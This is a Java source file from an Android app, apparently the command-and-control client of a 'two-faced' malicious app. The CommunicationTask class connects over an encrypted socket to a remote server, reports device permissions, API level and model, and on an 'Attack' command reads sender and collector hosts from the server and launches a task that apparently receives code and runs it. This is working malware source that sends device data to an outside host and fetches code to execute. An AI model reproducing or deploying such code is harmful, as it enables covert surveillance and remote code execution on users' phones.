package com.android.app_2_faces_net;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.android.app_2_faces_net.util.DeviceUtils;
import com.android.app_2_faces_net.util.ParamParser;

import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

public class CommunicationTask implements Runnable {
    private static final String TAG = "Communication Task";

    private final Context context;

    private final String socketMainHostname;
    private final int socketMainPort;

    private CryptedSocket socketMain;


    public CommunicationTask(Context context, String socketMainHostname, int socketMainPort) {
        this.context = context;
        this.socketMainHostname = socketMainHostname;
        this.socketMainPort = socketMainPort;
    }

    @Override
    public void run() {
        try {
            this.socketMain = new CryptedSocket(this.socketMainHostname, this.socketMainPort);
            this.socketMain.connect();

            this.socketMain.write("alive");
            boolean isAlive = true;

            while (isAlive) {
                String commandReceived = this.socketMain.read();
                Log.d(TAG, commandReceived);

                String toSend = "";
                switch (commandReceived) {
                    case "Permissions":
                        toSend = DeviceUtils.getPermissions(this.context, false);
                        break;
                    case "Permissions granted":
                        toSend = DeviceUtils.getPermissions(this.context, true);
                        break;
                    case "API":
                        toSend = DeviceUtils.getApiLevel();
                        break;
                    case "Model":
                        toSend = DeviceUtils.getDeviceModel();
                        break;
                    case "Attack":
                        //String senderServerString = this.socketMain.read();

                        CryptedSocket[] codeSenderSockets = ParamParser.parseCodeSenders(this.socketMain.read());
                        CryptedSocket collectorSocket = ParamParser.parseSocketCollector(this.socketMain.read());

                        String resultTypeString = ParamParser.parseResultType(this.socketMain.read());
                        String argString = ParamParser.parseArg(this.socketMain.read());
                        int polling = ParamParser.parsePolling(this.socketMain.read());
                        int num = ParamParser.parseNum(this.socketMain.read());


                        CompilationTask compilationTask = new CompilationTask(this.context, collectorSocket, codeSenderSockets, resultTypeString, argString, polling, num);
                        ExecutorService executor = Executors.newSingleThreadExecutor();
                        executor.execute(compilationTask);

                        toSend = "Starting";
                        break;
                    case "Close":
                        isAlive = false;
                        toSend = "Closing";
                        break;
                    default:
                        toSend = "Unknown command";
                }

                Log.d(TAG, toSend);
                this.socketMain.write(toSend);
            }
        } catch (IOException | PackageManager.NameNotFoundException e) {
            Log.d(TAG, Log.getStackTraceString(e));
            this.socketMain.close();
        }

        this.socketMain.close();
    }

    private String[] parseSocketCodeSenderList(String socketCodeSenderListString) {
        return socketCodeSenderListString.substring(9).split(Pattern.quote("|"));
    }
}
